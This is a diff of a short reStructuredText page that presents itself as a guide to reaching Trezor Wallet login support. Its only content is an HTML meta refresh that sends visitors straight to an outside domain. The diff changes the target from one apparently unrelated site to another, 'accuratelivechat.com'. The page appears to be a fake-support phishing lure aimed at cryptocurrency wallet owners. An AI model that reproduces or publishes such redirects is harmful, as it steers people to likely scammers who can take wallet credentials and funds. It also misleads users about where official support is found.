@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/">
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
 
 Need Help with Trezor Wallet Login? Here’s How to Reach Their Support Team 
 ============================================
